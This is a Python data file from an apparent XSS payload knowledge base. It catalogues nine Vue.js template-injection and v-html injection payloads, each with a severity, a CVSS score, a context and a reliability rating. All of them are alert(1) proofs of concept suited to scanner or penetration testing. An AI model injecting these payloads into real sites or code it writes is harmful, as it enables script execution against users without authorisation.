#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Vue.js Framework XSS Payloads
"""

from ..models import PayloadEntry


VUE_PAYLOADS = {
    "vue_1": PayloadEntry(
        payload="{{constructor.constructor('alert(1)')()}}",
        contexts=["template"],
        severity="critical",
        cvss_score=8.5,
        description="Vue template constructor chain",
        tags=["vue", "template", "constructor"],
        reliability="high",
    ),
    "vue_2": PayloadEntry(
        payload="{{_c.constructor('alert(1)')()}}",
        contexts=["template"],
        severity="critical",
        cvss_score=8.5,
        description="Vue _c (createElement) constructor",
        tags=["vue", "template", "_c"],
        reliability="medium",
    ),
    "vue_3": PayloadEntry(
        payload="{{$el.ownerDocument.defaultView.alert(1)}}",
        contexts=["template"],
        severity="critical",
        cvss_score=8.5,
        description="Vue $el to window.alert",
        tags=["vue", "template", "$el"],
        reliability="medium",
    ),
    "vue_4": PayloadEntry(
        payload="<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Vue v-html directive injection",
        tags=["vue", "v-html", "directive"],
        reliability="high",
    ),
    "vue_5": PayloadEntry(
        payload="{{String.fromCharCode(97,108,101,114,116)(1)}}",
        contexts=["template"],
        severity="critical",
        cvss_score=8.5,
        description="Vue fromCharCode execution",
        tags=["vue", "template", "fromcharcode"],
        reliability="medium",
    ),
    "vue_6": PayloadEntry(
        payload="{{`${alert(1)}`}}",
        contexts=["template"],
        severity="critical",
        cvss_score=8.5,
        description="Vue template literal in expression",
        tags=["vue", "template", "template-literal"],
        reliability="high",
    ),
    "vue_7": PayloadEntry(
        payload="<component :is=\"'script'\" v-html=\"'alert(1)'\"></component>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Dynamic component as script",
        tags=["vue", "component", "dynamic"],
        reliability="low",
    ),
    # === PortSwigger VueJS ===
    "ps-vue-v2": PayloadEntry(
        payload="{{_c.constructor('alert(1)')()}}",
        contexts=["html_content", "template"],
        severity="critical",
        cvss_score=9.0,
        description="VueJS v2 template injection",
        tags=["portswigger", "vue", "template-injection", "v2"],
        reliability="high",
    ),
    "ps-vue-v3": PayloadEntry(
        payload="{{_openBlock.constructor('alert(1)')()}}",
        contexts=["html_content", "template"],
        severity="critical",
        cvss_score=9.0,
        description="VueJS v3 template injection",
        tags=["portswigger", "vue", "template-injection", "v3"],
        reliability="high",
    ),
}

VUE_PAYLOADS_TOTAL = len(VUE_PAYLOADS)
